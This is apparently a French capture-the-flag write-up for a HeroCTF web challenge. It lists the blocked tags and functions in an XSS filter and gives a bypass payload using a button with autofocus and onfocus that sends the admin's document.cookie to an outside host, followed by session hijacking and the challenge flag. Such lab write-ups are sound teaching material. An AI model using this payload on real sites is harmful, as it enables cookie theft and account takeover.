# Contact Me ! v2

### Catégorie

Web

### Description

Le petit développeur a bien compris la faille et a appliqué un patch.
Montrez que lui que, malgré ses efforts, ce n'est pas suffisant !

http://challs.heroctf.fr:3011/

Format : Hero{flag}

### Auteur

Worty

### Note de l'auteur

A noter qu'il existe plusieurs solutions pour flag ce challenge, ici, je n'en présenterai qu'une seule.

### Solution

Ici, nous savons que nous avons à faire à une faille de type XSS.<br/>
En revanche, l'admin a mis en place des restrictions pour se prévenir de celle-ci.

Ici, il va falloir procéder à des tests pour savoir ce que l'on a le droit de faire ou non:<br/>
- La balise <script> est interdite<br/>
- La balise <img> est interdite<br/>
- La balise <iframe> est interdite<br/>
- La balise <body> est interdite<br/>
- La balise <span> est interdite<br/>
- L'évènement "onerror" est interdit<br/>
- L'évènement "onload" est interdit<br/>
- Le caractère "+" est interdit<br/>
- La chaîne de caractère "XML" est interdite<br/>
- La fonction "open" est interdite<br/>
- La fonction "eval" est interdite<br/>
- La fonction "atob" est interdite<br/>
A noter que le script ne prend pas en compte la casse, donc même écrire ScRIpt ne marchera pas pour bypass la restriction.

Maintenant que nous savons tout ce qui est interdit, qu'est ce qu'il nous reste?
Il reste la balise <button>, l'attribut autofocus et onfocus.
"autofocus" va permettre de passer la balise <button> en focus, et donc, avec l'évènement onfocus, on va pouvoir exécuter du code javascript!

Payload : <button autofocus onfocus="alert(1)">, et magie, on a une belle alert qui se lancer quand la page se réactualise!

Il y a maintenant un autre problème, le caractère "+" est aussi interdit, on va devoir utiliser la fonction concat() de javascript.<br/>
Cette fonction s'applique aux objets de type String. Exemple "a".contact("b") donnera "ab".<br/>
C'est donc comme ceci que nous allons concaténer les cookies de l'admin à notre payload !.<br/>

Payload final : <button autofocus onfocus="window.location='https://worty.alwaysdata.net/cookies.php?c='.concat(document.cookie)" />

Pareil que pour le challenge précédent, je me connecte sur http://challs.heroctf.fr:3011/admin.php, je change mon cookie de session par celui de l'administrateur que j'ai récupéré, et j'actualise!

### Flag

Hero{htmlspecialchars_m4y_b3_y0ur_fr13nd_!!}